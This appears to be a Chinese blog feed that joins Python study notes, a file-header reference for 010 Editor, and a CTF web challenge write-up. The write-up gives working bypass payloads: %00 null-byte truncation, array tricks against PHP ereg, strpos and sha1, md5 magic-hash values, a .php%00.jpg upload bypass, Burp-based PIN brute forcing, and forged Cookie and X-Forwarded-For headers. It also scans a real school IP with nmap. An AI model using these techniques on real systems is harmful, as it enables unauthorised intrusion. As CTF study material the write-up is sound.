xiaoming如果不确定字典中是否存在某个值而又想获取其值时，可以使用get，如果访问的键不在字典中，会返回默认值 info = {&apos;name&apos;:&apos;xiaoming&apos;} print(info.get(&apos;age&apos;)) # None print(info.get(&apos;age&apos;,18)) # 18修改字典元素 如果要添加的键已经存在，那么字典中该键对应的值会被新值替代 info{&apos;id&apos; : 16} info[&apos;id&apos;] = 2 print(info[&apos;id&apos;]) # 2添加字典元素使用变量名[‘键’] = ’数据‘ 时，如果字典不存在这个键，则会在字典中新增一个元素 info{&apos;id&apos; : 16} info[&apos;name&apos;] = &apos;xiaoming&apos; print(info) 删除字典元素del 删除字典 del name clear 清空字典元素 name.clear()计算字典的键值对的个数print( len(name) ) 字典的遍历1.遍历字典的键 获取字典的键视图 name.keys() #可用此方法遍历键 dict = {&apos;name&apos;:&apos;xiaoming&apos;,&apos;age&apos;:12} for key in dict.keys(): print(key) 2.遍历字典的值 获取字典的值视图 name.values() #可用此方法遍历值 dict = {&apos;name&apos;:&apos;xiaoming&apos;,&apos;age&apos;:12} for values in dict.values(): print(key) 3.遍历字典中的元素 -获取字典的元素视图 name.items() #可用此方法遍历元素 dict = {&apos;name&apos;:&apos;xiaoming&apos;,&apos;age&apos;:12} for key,values in dict.items(): print(key) 函数函数的定义和使用1.定义函数 def 函数名(参数列表)： &quot;函数_文档字符串&quot; 函数体 return 表达式 函数内容以冒号起始，并且缩进 return表达式结束函数 2.调用函数 定义完函数后，函数是不会自动执行的，需要调用它 def hanshu() print(&apos;hi&apos;) hanshu() # 调用函数的参数1.函数参数的传递 可以在定义函数的时候添加参数，让参数来接收传递给函数的值 def add(num1,num2) print(num1 + num2) add(1,3) # 打印出4 在调用函数的时候，传递的数据要和定义的参数一一对应 2.默认参数 定义函数时，可以给函数的参数设置默认值，这个参数就被称为默认参数。调用函数时，默认参数可直接忽略，而其它参数是必须要传入值的。如果默认参数没有传入值，则直接使用默认的值；如果默认参数传入了值，则使用传入的新值替代。 def hanshu(name,age = 35) print(name) print(age) hanshu(&apos;xiaoming&apos;) #xiaoming 35 hanshu(&apos;xiaoming&apos;,15) #xiaoming 15 带有默认值的参数一定要位于参数列表的最后面 3.不定长参数 args参数没有接受到数据，为一个空元祖 def test(a,b,*args): print(a) print(b) print(args) test(1,2) #1 2 () def test(a,b,*args): print(a) print(b) print(args) test(1,2,3,4,5) # 1,2,(3,4,5) 如果传入的参数没有名字，那么传入的值会给args变量；如果传入的参数有名字，那么传入的值会给kwargs变量 def test(a,b,*args,**kwargs): print(a) print(b) print(*args) print(**kwargs) test(1,2,3,4,5) # 1,2,(3,4,5) {} test(1,2,3,m=4,n=5) # 1,2,(3) {&apos;m&apos;:4,&apos;n&apos;:5}函数的返回值 程序中的函数完成一件事后，最后给调用者的结果。 根据函数的参数和返回值，函数可分为四种类型：1.函数无参数，无返回值 def hanshu(): print(&apos;hi&apos;) hanshu()2.函数无参数，有返回值 def hanshu(): return 30 temperature = hanshu() print(temperature)3.函数有参数，无返回值 def hanshu(num1,num2): result = num1 + num2 print(result) hanshu(1,2) 4.函数有参数，有返回值 def hanshu(num): if num == 1: result = 1 else: result = hanshu(num - 1) * num return result print(&apos;5!=&apos;,hanshu(5))变量作用域1.全局变量和局部变量局部变量，指的是定义在函数内的变量，即定义在def函数内的变量名，只能在def函数内使用，它与函数外具有相同名称的其它变量没有任何关系 def hanshu(): num = 1 print(num) def hanshu1(): num = 2 print(num) hanshu() hanshu1() 1 2全局变量是定义在函数外的变量，它拥有全局作用域 num = 5 def hanshu(): num = 1 print(num) hanshu() print(num) 1 52.global和nonlocal关键字global关键字用来在函数或其他局部作用域中使用全局变量(修改全局变量) num = 5 def hanshu(): global num num += 1 print(num) hanshu() print(num) 6 6nonlocal关键字可以在一个嵌套的函数中修改嵌套作用域中的变量 #不加 nonlocal def hanshu(): num = 1 def hh(): num = 2 hh() print(num) hanshu() 1 #加 nonlocal def hanshu(): num = 1 def hh(): nonlocal num num = 2 hh() print(num) hanshu() 2使用global关键字修饰的变量之前可以不存在，而使用nonlocal关键字修饰的变量在嵌套作用域中必须已经存在 匿名函数匿名函数是没有名称的函数，不再使用def定义，能接收任何数量的参数，但只能返回一个表达式的值 sum = lambda a,b:a+b print(sum(1,2)) 3 # 声明的函数支持所有运算 def hanshu(a,b,opt): print(opt(a,b)) hanshu(11,22,lambda x,y:x+y) hanshu(11,22,lambda x,y:x-y) 33 -11匿名函数与一般函数的区别、优缺点 def创建的函数是有名称的， 而lambda没有函数名称，这是最明显的区别之一 lambda 返回的结果通常是一个对象或者一个表达式，它不会将结果赋给一个变量，def则可以 lambda只是一个表达式，函数体比def简单很多，而def是一个语句 lambda表达式的冒号后面只能有一个表达式，def则可以有多个 像if或for等语句不能用于lambda中，def则可以 lambda一般用来定义简单的函数，而def可以定义复杂的函数 lambda函数不能共享给别的程序调用，def可以 时间日期函数1.时间函数 time模块 # 推迟调用线程的运行，括号内为秒数 import time time.sleep(1) print(time.ctime()) #Thu Jan 31 14:44:49 2019datatime # 获取时间 import datetime nowTime=datetime.datetime.now().strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)#现在 pastTime = (datetime.datetime.now()-datetime.timedelta(hours=1)).strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)#过去一小时时间 afterTomorrowTime = (datetime.datetime.now()+datetime.timedelta(days=2)).strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)#后天 tomorrowTime = (datetime.datetime.now()+datetime.timedelta(days=1)).strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)#明天 print(&apos;\n&apos;,nowTime,&apos;\n&apos;,pastTime,&apos;\n&apos;,afterTomorrowTime,&apos;\n&apos;,tomorrowTime)2.日历函数import calendar import calendar data = calendar.month(2018,6) print(data) June 2018 Mo Tu We Th Fr Sa Su 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30随机函数import random random.random():用于生成一个0~1之间的随机浮点数 random.uniform(a,b):返回a与b之间的随机浮点数，a，b大小可随机.返回范围范围左闭右闭 random.randint(a,b):返回a与b之间的随机整数，a的值一定要小于b的值.返回范围左闭右闭 random.randrang(a,b,step):返回某个区间内的整数，可以设置step.只能传入整数 random.choice(sequence):从列表、元组或字符串中返回一个随机的元素 random.shuffle():将列表中的元素打乱顺序 random.sample(sequence,k):从指定序列中随机获取k个元素作为一个片段返回，不会改变原有序列文件文件打开及读写1.文件打开 f = open（‘文件名’，‘访问模式’） 2.访问模式 r ：只读 w ：只写 如已存在则覆盖，不存在则重新创建 a ：只写 追加内容 w+ ：打开后，清空原有内容，成为一个新的空文件，对这个空文件具有读写权限 r+ ：打开后，保存原有内容，可以读取文件内容，追加写内容3.关闭文件在每次使用完文件后，都要使用close关闭文件 f.close() 4.写入数据用write方法写入数据 f.write(&apos; &apos;) 5.读取文件read b = f.read() #可加入数字表示读取数据的长度 print(b)redlines #返回一个列表，可循环打印出每行的数据 a = open(&apos;gtf.txt&apos;,&apos;r&apos;) b = a.readlines() for i in b: print(i)readline #一行一行读取数据 a = open(&apos;gtf.txt&apos;,&apos;r&apos;) b = a.readline() print(b)6.修改数据可以先读取文件内容，然后修改后重新写入该文件 文件的定位读写1.使用tell方法来获取文件当前的读写位置，返回文件的当前位置，即文件指针当前位置 &apos;gtf.txt&apos; :hello it is me a = open(&apos;gtf.txt&apos;,&apos;r&apos;) b = a.read(5) print(b) position = a.tell() print(position) c = a.read(3) print(c) position1 = a.tell() print(position1) hello 5 it 82.用seek定位到文件的指定读写位置 seek（a，b） a：表示偏移量，即需要移动的字节数 b： 0：从文件的起始位置开始偏移 1：从文件的当前位置开始偏移 2：从文件末尾开始偏移 文件的重命名和删除import os 1.重命名 os.rename(oldname,newname)描述路径时，原文件和新文件都应描述清楚，否则文件可能丢失2.删除 os.remove(name)文件夹import os 1.创建 os.mkdir(name)2.删除 os.rmdir(name)3.获取当前目录 os.getcwd()4.改变默认目录 os.chdir(&apos;..\&apos;) 将目录改变为上一级的目录5.获取目录列表 os.listdir(&apos;./&apos;)异常异常类NameError尝试访问一个未声明的变量，会引发NameError ZeroDivisionError当除数为零的时候，会引发ZeroDivisionError SyntaxError当解释器发现语法错误时，会引发SyntaxError错误SyntaxError异常是唯一不在运行时发生的异常 IndexError当使用序列中不存在的索引时，会引发IndexError异常 KeyError当时用映射中不存在的键时，会引发KeyError异常 FileNotFoundError试图打开不存在的文件时，会引发FileNotFoundError异常 AttributeError当尝试访问未知的对象属性时，会引发AttributeError异常 异常处理1.捕获简单异常 try: ...... except nameError： ......只要监控到错误，程序就会执行except里面的语句，并且不再执行try里面未执行的语句2.捕获多个异常 try: ...... except nameError1: ...... except nameError2: ...... ......要使一个except子句捕获多个异常，可以使用元组来表示 except (nameError1,nameError2): 3.捕获异常的描述信息使用一个except子句捕获多个异常时，为了区分不同的错误信息，可以使用as获取系统反馈的错误信息 try: ...... except (nameError1,nameError2) as result: print(result) # 捕获到异常中的任意一个时，就会把描述信息保存到result变量中4.捕获所有的异常 try: ...... except： ...... # 捕获所有的异常 try: ...... except Exception as result： print(result) # 捕获所有的异常以及描述信息5.异常处理的完整语句 try: ... except NameError: ... except: ... else: #若果无异常，则执行 ... finally: # 无论是否异常，总会执行(通常情况下，用于释放资源) ...抛出异常1.使用类名引发异常 raise 异常的类名 2.使用异常类的实例引发异常 a = Indexerror() raise a 3.传递异常 不带任何参数的raise语句，可以再次引发刚刚发生过的异常 4.指定异常的描述信息 raise IndexError(&apos;下标超出范围&apos;)5在异常中抛出另外一个异常 try: num excpt Exception as except: raise IndexError(&apos;下标超出范围&apos;) from exception # 会产生NameError和IndexErrorassert（断言）语句:1.当用户定义的约束条件不满足的时候，会触发AssertionError异常格式:assert 逻辑表达式，data逻辑表达式相当于条件，data通常是一个字符串，当表达式false时，作为异常类型的描述信息使用逻辑上等于 if not 逻辑表达式： raise AssertionError(data) 预定义清理使用with语句，无论资源在使用过程中是否发生异常，都会执行释放资源的操作 with 上下文表达式[as 资源对象]: 对象的操作 with open(&apos;gtf.txt&apos;) as file: data = file.read() # 如果能顺利打开文件，则将文件对象赋值给file，然后调用read方法读取了file对象的数据；当对象操作结束后，with语句会关闭文件，即使这段代码在运行过程中产生了异常，with语句也会关闭文件模块模块的基本使用1.引入模块 import ...调用模块中的函数时，必须：模块名.函数名2.只引入函数 from 模块名 import 函数名1,2... 调用函数时，只能给出函数名3.引入模块的所有函数 from 模块名 import *模块的制作1.制作函数 test.py: def sum(a,b): print(a+b)则在主程序中可以引入这个函数 from test import sum sum(1,3)或 import test test.sum(1,3)但test.py中可能有测试代码,为了不使主程序运行测试代码，可在测试代码前加上 if __name__ == &apos;__main__&apos;:每个模块都有一个name属性，当其值为’main‘时，表明该模块自身在运行，否则是被引用 2.制作类lei.py: class first(): def move(self): print(&apos;biu&apos;)在主程序可以引入这个类 from lei import first duixiang = first() #创建对象 或 import lei duixiang = lei.first() #创建对象类和对象类类是有一些系列有共同特征和行为事物的抽象概念的总和 类名：首字母必须大写 属性：描述特征 方法：描述行为类的定义 class 类名： #属性 #方法 def move（self）： print（‘move’） #方法必须显示地声明一个self函数，第一个参数永远都是self，表示的是对象自身对象1.根据类创建对象 创建对象 对象名 = 类名（） 添加属性 对象名.属性名 = 值 调用方法 对象名.方法函数名（）2.构造方法在创建对象的时候设置好属性,当创建类实例的时候，系统会自动调用构造方法，从而实现对类进行初始化的操作 def __init__(self): self.other = 值 #在init中返回 None带参构造 def __init__(self,other): self.others = other3.析构方法当删除一个对象来释放类所占用资源的时候，python解释器默认会调用另外一个方法：del 方法 使用del语句可以删除一个对象，释放它所占用的空间 &gt;&gt;&gt; class lei: def __init__(self): print(&apos;我是init方法，我被调用了&apos;) def __del__(self): print(&apos;我是del方法，我被调用了&apos;) &gt;&gt;&gt; a1 = lei() 我是init方法，我被调用了 &gt;&gt;&gt; a2 = a1 #增加标签 &gt;&gt;&gt; del a1 &gt;&gt;&gt; del a2 #完全删除才会调用 我是del方法，我被调用了python有自动回收垃圾的机制，当python程序结束的时候，python解释器会检测当前是否有需要释放的内存空间，如果有就自动调用del语句删掉，如果已经手动调用了del语句，就不再自动删除 封装通常把隐藏属性、方法与方法实现细节的过程称为封装。为了保护类里面的属性，避免外界随意赋值，可采用如下方式解决： 把属性定义为私有属性，即在属性名的前面加上两个下划线 添加可以供外界调用的两个方法，分别用于设置或者获取属性值下列代码中，将age设为了私有属性，类的外面无法知道类里面的私有属性，更无法访问类的私有属性 &gt;&gt;&gt; class lei: def __init__(self,name,age): self.name = name self.__age = age &gt;&gt;&gt; a1 = lei(&apos;xiaoming&apos;,12) &gt;&gt;&gt; a1.name &apos;xiaoming&apos; &gt;&gt;&gt; a1.__age Traceback (most recent call last): File &quot;&lt;pyshell#16&gt;&quot;, line 1, in &lt;module&gt; a1.__age AttributeError: &apos;lei&apos; object has no attribute &apos;__age&apos;添加可以供外界调用的两个方法,分别设置和获取私有属性__age的值： &gt;&gt;&gt; class lei: def __init__(self,name,age): self.name = name self.__age = age def set(self,newage): if newage &gt; 0 and newage &lt; 100: self.__age = newage def get(self): return self.__age &gt;&gt;&gt; a = lei(&apos;xiaoming&apos;,12) &gt;&gt;&gt; a.name &apos;xiaoming&apos; &gt;&gt;&gt; a.set(13) &gt;&gt;&gt; a.get() 13继承类的继承是指在一个现有类的基础上构建一个新的类，构建出来的新类被称作子类，现有类被称作父类，子类会自动拥有父类的属性和方法1.单继承格式如下： class 子类名（父类名）：假设有两个类A、B，B类是A类的子类 class A(object): class B(A):如果在类的定义中没有标注出父类，这个类默认是继承自object的：class lei 与 class lei(object)是等价的 父类的私有属性和私有方法是不会被子类继承的，更不能被子类访问 如果子类没有初始化，则默认同父类初始化相同 &gt;&gt;&gt; class lei(object): def __init__(self,color): self.color = color def print(self): print(&apos;我在父类里面创建&apos;) &gt;&gt;&gt; class zilei(lei): pass &gt;&gt;&gt; a = zilei(&apos;black&apos;) &gt;&gt;&gt; a.color &apos;black&apos; &gt;&gt;&gt; a.print() 我在父类里面创建2.多继承多继承就是子类拥有多个父类，并且具有他们共同的特征格式如下： class 子类(父类1，父类2...)如果子类继承的多个父类间是平行关系，子类先继承哪个类就会调用哪个类的方法 &gt;&gt;&gt; class fish: def move(self): print(&apos;im fish&apos;) &gt;&gt;&gt; class bird: def move(self): print(&apos;im bird&apos;) &gt;&gt;&gt; class sum(fish,bird): pass &gt;&gt;&gt; a = sum() &gt;&gt;&gt; a.move() im fish3.重写父类方法与调用父类方法 在子类中重写的方法要和父类被重写的方法具有相同的方法名和参数列表 &gt;&gt;&gt; class foreigner: def say(self): print(&apos;hello&apos;) &gt;&gt;&gt; class chinese(foreigner): def say(self): print(&apos;你好&apos;) &gt;&gt;&gt; one = chinese() &gt;&gt;&gt; one.say() 你好4.子类和父类都定义了初始化函数，则父类的属性不会被初始化 class parent(object): def __init__(self, name): self.name = name class child(parent): def __init__(self): print(&apos;Im a child&apos;) a = child() #a = child(&apos;xiaoming&apos;)会报错5.可以使用super方法调用父类，子类和父类的属性均可被初始化 class parent(object): def __init__(self, name): self.name = name class child(parent): def __init__(self): print(&apos;Im a child&apos;) super(child,self).__init__(&quot;xiaoming&quot;) a = child() print(a.name)运行结果为： Im a child xiaoming参考： https://blog.csdn.net/brucewong0516/article/details/79121179多态调用同一个方法，出现多种表现形式。不关注对象的类型，而是关注对象具有的行为 &gt;&gt;&gt; class dog: def shout(self): print(&apos;旺旺!&apos;) &gt;&gt;&gt; class cat: def shout(self): print(&apos;喵喵！&apos;) &gt;&gt;&gt; def hanshu(obj): obj.shout() &gt;&gt;&gt; dog = dog() &gt;&gt;&gt; cat = cat() &gt;&gt;&gt; hanshu(dog) 旺旺! &gt;&gt;&gt; hanshu(cat) 喵喵！类属性和实例属性1.实例属性：通过 ‘实例.属性’ 的方式添加属性和访问属性值 class cat: def __init__(self): self.age = 12 #实例属性2.类属性：类拥有的属性，位于类内部，方法外面，它被所有类的实例对象所共有，在内存中只存在一个副本 class cat: num = 0 #类属性类属性可以通过类或者类的实例访问到 &gt;&gt;&gt; class cat: num = 0 def __init__(self): self.age = 11 &gt;&gt;&gt; a = cat() &gt;&gt;&gt; a.num 0 &gt;&gt;&gt; cat.num 0当类属性和实例属性的名字相同时，通过对象访问属性时会获取实例属性对应的值，通过类获取到的一定是类属性的值 &gt;&gt;&gt; class cat: num = 0 def __init__(self): self.num = 11 &gt;&gt;&gt; a = cat() &gt;&gt;&gt; a.num 11 &gt;&gt;&gt; cat.num 0其他知识内置函数eval() : 将字符串str当成有效的表达式来求值并返回计算结果 round() : 返回浮点数的四舍五入值 id() : 返回对象的内存地址 pyinstallerpyinstaller -F -w -i C:\\a.ico C:\\main.py-i : 设置图标；先图标路径，再程序路径 图像缩放操作from PIL import Image # 打开一个jpg图像文件，注意是当前路径: im = Image.open(&apos;test.jpg&apos;) # 获得图像尺寸: w, h = im.size print(&apos;Original image size: %sx%s&apos; % (w, h)) # 缩放到50%: im.thumbnail((w//2, h//2)) print(&apos;Resize image to: %sx%s&apos; % (w//2, h//2)) # 把缩放后的图像用jpeg格式保存: im.save(&apos;thumbnail.jpg&apos;, &apos;jpeg&apos;)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用010editor修复文件]]></title>
    <url>%2F2018%2F07%2F22%2FSixth-day%2F</url>
    <content type="text"><![CDATA[010 Editor 是一款全新概念的十六进制编辑器，能解析和编辑一切可视的二进制文件方面功能强大。 修复.exe文件找到第三行第c列，找到其值，然后将其对应的坐标的二进制值改为50 45如果其后有50 45，将其改为00 00 文件二进制头与文件类型的判断JPEG (jpg)，文件头：FFD8FF 文件尾：FFD9 PNG (png)，文件头：89504E470D0A1A0A 文件尾：AE 42 60 82 GIF (gif)，文件头：47494638 文件尾：00 3B ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 TIFF (tif)，文件头：49492A00 Windows Bitmap (bmp)，文件头：424D Execute File(.exe .dll .drv .vxd .sys .ocx .vbx) 文件头:4D5A900003 CAD (dwg)，文件头：41433130 Adobe Photoshop (psd)，文件头：38425053 Rich Text Format (rtf)，文件头：7B5C727466 XML (xml)，文件头：3C3F786D6C HTML (html)，文件头：68746D6C3E Email [thorough only] (eml)，文件头：44656C69766572792D646174653A Outlook Express (dbx)，文件头：CFAD12FEC5FD746F Outlook (pst)，文件头：2142444E MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 MS Access (mdb)，文件头：5374616E64617264204A WordPerfect (wpd)，文件头：FF575043 Postscript (eps.or.ps)，文件头：252150532D41646F6265 Adobe Acrobat (pdf)，文件头：255044462D312E Quicken (qdf)，文件头：AC9EBD8F Windows Password (pwl)，文件头：E3828596 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 Wave (wav)，文件头：57415645 AVI (avi)，文件头：41564920 Real Audio (ram)，文件头：2E7261FD Real Media (rm)，文件头：2E524D46 MPEG (mpg)，文件头：000001BA MPEG (mpg)，文件头：000001B3 Quicktime (mov)，文件头：6D6F6F76 Windows Media (asf)，文件头：3026B2758E66CF11 MIDI (mid)，文件头：4D546864]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Practice of Web]]></title>
    <url>%2F2018%2F07%2F20%2FSum-of-Web%2F</url>
    <content type="text"><![CDATA[这一周对web学习差不多快结束了，在此总结一下本周所做的题 签到题题目描述 点开后 由于题目说不用使用工具，则右击-查看页面源代码-成功找到flag 怎么做都好做，没flag就抓包题目描述 点开后 点击链接 则进行抓包，发现没有要找的信息 右击-发送到repeater-go 成功找到flag 小结：Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。 /X00题目描述 点开后 view-source: if (isset ($_GET[&apos;nctf&apos;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; }发现这是php语言，nctf为参数名，而且其值要满足： 为1-9的数字 包含&apos;#biubiubiu&apos;方法一：00截断但既然是数字，那应该怎样添加字符串’#biubiubiu’呢？ 由于题目是/X00,则试一下00截断 PHP的00截断是一个漏洞，当用户输入的url参数包含%00经过浏览器自动转码后截断后面字符。 ereg()无法将%00后的字符串读进去进行比较 URL中，从’？’开始到’#’为止之间的部分为参数部分，又称搜索部分、查询部分‘#’代表网页中的一个位置。其右面的字符，就是该位置的标识符 则要将’#’转换成十六进制形式 在网址后加上 /?nctf=1%00%23biubiubiu即成为 http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php/?nctf=1%00%23biubiubiu再回车，成功获得flag 附：URL特殊符号及编码 序号 特殊字符 含义 十六进制值 1. + URL 中+号表示空格 %2B 2. 空格 URL中的空格可以用+号或者编码 %20 3. / 分隔目录和子目录 %2F 4. ? 分隔实际的 URL 和参数 %3F 5. % 指定特殊字符 %25 6. # 表示书签 %23 7. &amp; URL 中指定的参数间的分隔符 %26 8. = URL 中指定参数的值 %3D方法二: 数组截断利用ereg()函数与strpos()函数的共同漏洞： ereg()比较一个数组和字符串时会返回-1，即变为-1===FALSE;传入一个数组给strpos()时，会出错返回null,即变为null!==FALSE 在网址后加上 /?nctf[]= #任意值均可成功获得flag web4题目描述 点击后 点进去后发现有几行“乱码” URL编码 url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 则将var p1、%35%34%61%32、var p2拼接到一起进行编码，得到 function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;将”67d709b2b54aa2aa648cf6e87a7114f1”这串字符串submit，成功获得flag web5 打开后 查看源代码 JSFuck编码： 可以让你只用 6 个字符 ‘[ ]’ ‘( )’ ‘!’ ‘+’ 来编写 JavaScript 程序 进行解码 用火狐浏览器web开发者-web控制台进行转码，成功获得flag cookie题目描述 点开后 查看源代码发现什么信息都没有，则进行抓包 发现cookie中：Login=0 则将0改为1 然后Forward 成功获得flag 矛盾题目描述 点开后是几行php代码 $num=$_GET[&apos;num&apos;]; if(!is_numeric($num)) { echo $num; if($num==1) echo &apos;flag{**********}&apos;; }参数num得满足： num不是数字num的值为1 仔细观察 $num == 1 ,发现其实值是“若等于”1 则可用一个以1为开头的字符串作为num的参数，添加参数到网址，回车即可获得flag 小结： php中的“==”与“===”： === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 头有点大题目描述 点开后是一个提示页面 提示说需要修改.net framework,在England，而且使用Internet Explorer浏览器 进行抓包 在 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0)括号末尾加上.NET CLR9.9 (安装.Net Framework后，MSI会将“.NET CLR”添加到User Agent字符串中) 将Accpt-Language后面修改为 en-gb 在Mozilla/5.0后添加 compatible IE 6.0 使得服务器认为我们使用的是IE6.0的浏览器 修改后，右键发送到repeater，go即可获得flag 没有人的密码会这么简单题目描述 打开后 进行抓包，然后右键-send to intruder 在Intruder-Position中设置，将自动设置的position【Clear】掉，然后在请求中user_pw的地方点击【Add】添加position 选择所需要的字典，打开Intruder-Payloads，在Payload Type中选择Numbers 选择数字起点、终点和步长，在Payload Option中设置；由于第一位不是0，则从1000开始到9999结束，步长设置为1 点击左上角intruder-attack开始破解 跑完后，找出与众不同的lenth，选中后点response，即可查看能否登录 成功破解，得到flag 我说的是真的题目描述 点开后 进去发现 由于题目是“我说的是真的”，则返回到“到这里找key”的页面，查看源代码 &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;./search_key.php&quot;&gt;_到这里找key__&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;点击search_key.php，成功得到flag 你会改后缀吗题目描述 点开后 有一张动态小猫图片 查看源代码 &lt;html&gt; &lt;title&gt;你是在坑我？&lt;/title&gt; &lt;body&gt; 答案又是啥。。 &lt;img src=&quot;2.gif&quot; width=&quot;100&quot; height=&quot;100&quot; /&gt; &lt;/body&gt; &lt;/html&gt;由于此题与后缀有关，则先将图片保存下来那么要将后缀改成什么格式呢？ 将后缀改为.html，打开后，成功找到flag 文件上传比想象的难一点题目描述 点开后 查看源代码 &lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt; Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件则将一个jpg格式的文件上传，发现 那就上传一个php文件，发现 发现叙述很矛盾 这里就需要用00截断的方法 什么是00截断呢？ 网站上传函数处理xxx.php%00.jpg时，首先后缀名是合法的jpg格式，可以上传，在保存文件时，遇到%00字符，丢弃后面的jpg，文件后缀最终保存的后缀名为xxx.php 在上传时使用拦截，得到上传信息 在uploads后，自己手动构造一个上传的文件’1.php.jpg’,然后转到Hex页面，找到 . 对应的16进制2e,修改为00 再回到Raw，发现空格已经变成一个框框，框框表示一个空字节 然后forward，成功获得flag 一道简单的ctf题目题目描述 点开后 提交一个php文件，显示 非图片文件则说明文件类型要为图片类型 进行抓包，找到content-type 将后面修改为image/jpeg 或image/png forward，即可成功获得flag 比较大小题目描述 点开后 随便输入数字，提交页面显示 数字太小了！查看源代码 &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;text&quot; maxlength=&quot;3&quot; name=&quot;v&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 数字太小了！发现有一行’input type … maxlenth’，而且题目提示用F12，则此题需要修改网页源代码 则右键选择-查看元素 找到input maxlenth，将‘3’改为‘4’（比三大就行） 再输入9999提交，成功获得flag nmap我用过题目描述 点题目链接，发现链接是学校官网 根据题目提示，在cmd输入 nmap -F -sT -v 202.196.32.7扫完后 则 22808080 即为flag 附：F：扫描100个最有可能开放的端口v 获取扫描的信息sT：采用的是TCP扫描 不写也是可以的，默认采用的就是TCP扫描 111题目描述 点开后，发现进入了一个动态页面 右键-查看源码 找到flag 仔细看看源代码题目描述 点进链接，到达一个网页，然后查看源代码 发现有个后缀为.html的链接 点击去，发现下一个页面还有这个链接，继续点下去 发现这么多行代码隐藏着flag信息！ 附： 什么是HTML 超文本标记语言，标准通用标记语言下的一个应用。“超文本”就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。超文本标记语言的结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。 md5加密 代码分析题目描述 点击链接 please input a则分析PHP代码 首先要在网址后添加一个参数a，a的值要满足 不能为’QNKCDZO’a的md5的值要与’QNKCDZO’的md5值若相等 由于是md5加密，则搜索md5加密工具，搜索’QNKCDZO’ 加密后为 0e830400451993494058024219903391 #md5（）函数默认转换为32字符十六进制数由于比较是‘若等于’，则加密后的字符串转化为数字为0(以0e开头，即认为是0的…次方) 则只要a的参数加密后以0e开头即可 百度‘以0e开头的MD5’即可找到 在地址栏后面加上？a=s878926199a（或者其他符合的）回车即可获得flag 你知道base加密吗题目描述 点开后 输入任意值提交不对，查看源代码什么也没有 则进行抓包，右键发送到repeater，go 发现response中的content-row后有一行‘代码’ 进行base转码，得到一串数字 提交，成功获得flag php代码审计题目描述 点开后 则要先分析PHP代码 要有两个参数名，name和passwordname不能等于passwordname的shal要和password的shal相等 利用sha1无法处理数组类型，即可利用数组绕过 在地址栏后添加？name[]=1&amp;password[]=12，回车即可获得flag 密码爆破题目描述 点开后 进行抓包 由于每次登陆验证码都会刷新，则将验证码设为空，只有pwd这一个变量 进行instuder，破解得到正确密码，提交得到flag 上传成功也不一定得到flag哦！！题目描述 点开后 查看源代码 分析源代码 split返回文件名以’.’分割后的数组，str[1]即为此文件的第一个后缀为jpg格式的 使用’1.jpg’上传，出现 真乖，您上传了一张jpeg的图片，上传成功！扩展后缀名为’1.jpg.txt’，成功获得flag robots了解一下题目描述 点击链接，进到了一个网站 http://www.wechall.net/challenge/training/www/robots/index.php搜索关于robots的知识 robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。 robots.txt文件必须驻留在域的根目录，并且必须命名为“robots.txt” 则将网址改为 http://www.wechall.net/robots.txt回车，进到了一个页面 则TOPS3CR3T即为flag 本机登陆题目描述 点开链接 进行抓包 将isadmin值修改为1，认为我是管理员 添加IP信息 X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。 forward即可获得flag 根据提示来，密码已经告诉你题目描述 点开后 